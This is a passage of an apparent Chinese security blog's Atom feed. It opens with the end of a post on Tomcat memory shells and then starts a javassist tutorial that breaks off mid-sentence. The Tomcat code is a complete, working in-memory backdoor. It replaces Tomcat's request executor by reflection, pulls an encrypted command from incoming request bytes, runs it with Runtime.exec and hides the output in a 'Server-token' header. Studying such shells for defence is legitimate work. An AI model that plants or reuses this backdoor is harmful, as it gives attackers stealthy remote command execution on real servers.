class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            &#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getStandardService</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> jioEndPoint;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//恶意executor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">threadexcutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">threadexcutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize, <span class="hljs-type">int</span> maximumPoolSize, <span class="hljs-type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;<br>            <span class="hljs-built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br><br><br>                                    Object[] objects = (Object[]) getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;nioChannels&quot;</span>), <span class="hljs-string">&quot;stack&quot;</span>);<br><br><br>                                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">heapByteBuffer</span> <span class="hljs-operator">=</span> (ByteBuffer) getField(getField(objects[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;appReadBufHandler&quot;</span>), <span class="hljs-string">&quot;byteBuffer&quot;</span>);<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(heapByteBuffer.array(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br><br>                                    <span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>));<br>                                        System.out.println(a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br>                                        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.substring(a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>) + <span class="hljs-string">&quot;blue0&quot;</span>.length() + <span class="hljs-number">1</span>, a.indexOf(<span class="hljs-string">&quot;\r&quot;</span>, a.indexOf(<span class="hljs-string">&quot;blue0&quot;</span>)) - <span class="hljs-number">1</span>);<br><br>                                        b = decode(DEFAULT_SECRET_KEY, b);<br><br>                                        <span class="hljs-keyword">return</span> b;<br>                                    &#125;<br><br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    System.out.println(var11);<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getResponse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] res)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>));<br><br>                <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">threadName</span> <span class="hljs-operator">=</span> thread.getName();<br>                        <span class="hljs-keyword">if</span> (!threadName.contains(<span class="hljs-string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>), <span class="hljs-string">&quot;processors&quot;</span>);<br>                                    <span class="hljs-keyword">for</span> (Object tmp_object : objects) &#123;<br>                                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (RequestInfo) tmp_object;<br>                                        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) getField(getField(request, <span class="hljs-string">&quot;req&quot;</span>), <span class="hljs-string">&quot;response&quot;</span>);<br>                                        response.addHeader(<span class="hljs-string">&quot;Server-token&quot;</span>, encode(DEFAULT_SECRET_KEY,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;UTF-8&quot;</span>)));<br><br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                                    <span class="hljs-keyword">continue</span>;<br>                                &#125;<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> &#123;<br><span class="hljs-comment">//            System.out.println(&quot;123&quot;);</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> getRequest();<br>            <span class="hljs-keyword">if</span> (cmd.length() &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> rt.exec(cmd);<br>                    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>                    java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>                    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-keyword">while</span> ((tmp = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        s += tmp;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (s != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                        <span class="hljs-type">byte</span>[] res = s.getBytes(StandardCharsets.UTF_8);<br>                        getResponse(res);<br>                    &#125;<br><br><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">this</span>.execute(command, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS);<br>        &#125;<br><br>    &#125;<br><br>%&gt;<br><br>&lt;%<br>    <span class="hljs-type">NioEndpoint</span> <span class="hljs-variable">nioEndpoint</span> <span class="hljs-operator">=</span> (NioEndpoint) getStandardService();<br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="hljs-string">&quot;executor&quot;</span>);<br>    <span class="hljs-type">threadexcutor</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());<br>    nioEndpoint.setExecutor(exe);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。&lt;/p&gt;
&lt;h1 id=&quot;tomcat-valve内存马&quot;&gt;&lt;a href=&quot;#Tomcat-Valve内存马&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>javassist学习</title>
    <link href="https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/javassist%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:35:52.000Z</published>
    <updated>2024-09-07T09:56:25.699Z</updated>
    
    <content type="html"><![CDATA[<p>因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>这是官方文档：<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1 id="javassist介绍"><a href="#javassist介绍" class="headerlink" title="javassist介绍"></a>javassist介绍</h1><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库.；其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类。</p><p>使用前导入jar包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassist中最为重要的是<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>以及<code>CtField</code>这几个类.</p><ul><li><code>ClassPool</code>: 一个基于<code>Hashtable</code>实现的<code>CtClass</code>对象容器, 其中键是类名称, 值是表示该类的<code>CtClass</code>对象</li><li><code>CtClass</code>: <code>CtClass</code>表示类, 一个<code>CtClass</code>(编译时类)对象可以处理一个class文件, 这些<code>CtClass</code>对象可以从<code>ClassPool</code>获得</li><li><code>CtMethod</code>: 表示类中的方法</li><li><code>CtField</code>: 表示类中的字段</li><li><code>CtConstructor</code>:可读写的类构造方法对象</li></ul><h1 id="classpool相关方法"><a href="#ClassPool相关方法" class="headerlink" title="ClassPool相关方法"></a>ClassPool相关方法</h1><ul><li><code>getDefault</code>: 返回默认的<code>ClassPool</code>是单例模式的，一般通过该方法创建我们的<code>ClassPool</code>；</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : 将一个<code>ClassPath</code>加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li><code>toClass</code> : 将修改后的<code>CtClass</code>加载至当前线程的上下文类加载器中，<code>CtClass</code>的<code>toClass</code>方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li><code>get</code> , <code>getCtClass</code>: 根据类路径名获取该类的<code>CtClass</code>对象，用于后续的编辑。</li></ul><p>ClassPool对象的创建</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取ClassPool对象, 使用系统默认类路径</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 效果与 new ClassPool(true) 一致，只不过返回的是默认的单例模式</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>为减少ClassPool可能导致的内存消耗； 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 从ClassPool中删除CtClass对象</span><br>ctClass.detach();<br><span class="hljs-comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1 id="ctclass相关方法"><a href="#CtClass相关方法" class="headerlink" title="CtClass相关方法"></a>CtClass相关方法</h1><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><h2 id="获取ctclass"><a href="#获取CtClass" class="headerlink" title="获取CtClass"></a>获取CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//未获取到类或抛异常</span><br><span class="hljs-comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//冻结类，即不能修改</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//检查是否冻结，即不可修改</span><br></code></pre></td></tr></table></figure><h2 id="创建ctclass"><a href="#创建CtClass" class="headerlink" title="创建CtClass"></a>创建CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 复制一个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// 创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// 通过class文件创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>创建一个类然后写入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建新类并写入</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>然后就会根据名称保存到对应的目录下，将类持久化了到文件中</p><h2 id="ctclass基础信息"><a href="#CtClass基础信息" class="headerlink" title="CtClass基础信息"></a>CtClass基础信息</h2><p>就是一些类的各种基础信息，类全名、类方法、类字段等</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 类名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// 类全名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// 包名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// 接口</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// 继承类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// 获取类方法</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// 获取类字段</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// 判断数组类型</span><br>ctClass.isArray();<br><span class="hljs-comment">// 判断原生类型</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// 判断接口类型</span><br>ctClass.isInterface();<br><span class="hljs-comment">// 判断枚举类型</span><br>ctClass.isEnum();<br><span class="hljs-comment">// 判断注解类型</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// 冻结一个类，使其不可修改</span><br>ctClass.freeze () <br><span class="hljs-comment">// 判断一个类是否已被冻结</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用</span><br>ctClass.prune() <br><span class="hljs-comment">//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2 id="对ctclass进行操作"><a href="#对CtClass进行操作" class="headerlink" title="对CtClass进行操作"></a>对CtClass进行操作</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 添加接口</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// 添加构造器</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// 添加字段</span><br>ctClass.addField(...);<br><span class="hljs-comment">// 添加方法</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2 id="ctclass编译"><a href="#CtClass编译" class="headerlink" title="CtClass编译"></a>CtClass编译</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 类的字节码文件</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="ctmethod相关方法"><a href="#CtMethod相关方法" class="headerlink" title="CtMethod相关方法"></a>CtMethod相关方法</h1><p><code>CtMthod</code>代表类中的某个方法，可以通过<code>CtClass</code>提供的API获取或者<code>CtNewMethod</code>新建，通过<code>CtMethod</code>对象可以实现对方法的修改。</p><p>CtNewMethod有点类似一个工具类，里面的方法都是静态方法，比如生成一个新的CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : 在方法的起始位置插入代码；</p></li><li><p>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</p></li><li><p>insertAt : 在指定的位置插入代码；</p></li><li><p>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</p></li><li><p>make : 创建一个新的方法，本质就是调用CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2 id="ctmethod属性获取"><a href="#CtMethod属性获取" class="headerlink" title="CtMethod属性获取"></a>CtMethod属性获取</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// 方法名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// 返回类型</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// 方法参数, 通过此种方式得到方法参数列表</span><br><span class="hljs-comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// 非静态的成员函数的第一个参数是this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ctmethod方法体修改"><a href="#CtMethod方法体修改" class="headerlink" title="CtMethod方法体修改"></a>CtMethod方法体修改</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在方法体前插入代码块</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在方法体后插入代码块</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在某行 字节码 后插入代码块</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 添加参数</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// 设置方法名</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//创建一个新的方法</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2 id="异常块添加"><a href="#异常块添加" class="headerlink" title="异常块添加"></a>异常块添加</h2><p>在方法中加入try catch块, 需要注意的是, 